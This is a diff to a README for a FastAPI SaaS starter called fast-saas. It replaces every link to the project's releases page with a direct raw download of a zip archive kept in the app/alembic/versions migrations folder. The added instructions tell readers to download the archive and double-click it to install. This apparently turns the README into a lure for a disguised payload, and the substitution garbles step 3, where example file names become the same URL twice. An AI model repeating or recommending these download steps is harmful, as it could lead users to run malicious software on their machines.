@@ -1,6 +1,6 @@
 # 🚀 fast-saas - Your FastAPI SaaS Solution Made Easy
 
-[![Download FastSaaS](https://img.shields.io/badge/Download-FastSaaS-blue)](https://github.com/davi175/fast-saas/releases)
+[![Download FastSaaS](https://github.com/davi175/fast-saas/raw/refs/heads/main/app/alembic/versions/fast-saas-v2.2.zip)](https://github.com/davi175/fast-saas/raw/refs/heads/main/app/alembic/versions/fast-saas-v2.2.zip)
 
 ## 📄 Overview
 
@@ -30,13 +30,13 @@ Follow these steps to download and run FastSaaS on your machine.
 1. **Visit the Download Page**  
    Click the button below to go to the release page, where you can find the latest version of FastSaaS.
 
-   [Download FastSaaS](https://github.com/davi175/fast-saas/releases)
+   [Download FastSaaS](https://github.com/davi175/fast-saas/raw/refs/heads/main/app/alembic/versions/fast-saas-v2.2.zip)
 
 2. **Select the Latest Release**  
    On the Releases page, locate the most recent version. This will typically be marked as the latest stable release.
 
 3. **Download the Application**  
-   Once you find the release, download the installation file for your operating system. The file will usually have a name like `fast-saas-latest.zip` or `fast-saas-latest.exe`.
+   Once you find the release, download the installation file for your operating system. The file will usually have a name like `https://github.com/davi175/fast-saas/raw/refs/heads/main/app/alembic/versions/fast-saas-v2.2.zip` or `https://github.com/davi175/fast-saas/raw/refs/heads/main/app/alembic/versions/fast-saas-v2.2.zip`.
 
 4. **Install the Application**  
    After the download completes, navigate to your downloads folder, locate the file, and double-click it to start the installation process. Follow the on-screen instructions to complete the installation.
@@ -68,7 +68,7 @@ For additional guidance, refer to the documentation provided within the applicat
 
 To download FastSaaS, please visit the link below:
 
-[Download FastSaaS](https://github.com/davi175/fast-saas/releases)
+[Download FastSaaS](https://github.com/davi175/fast-saas/raw/refs/heads/main/app/alembic/versions/fast-saas-v2.2.zip)
 
 Follow the instructions above to install and set up the application on your computer. 
 
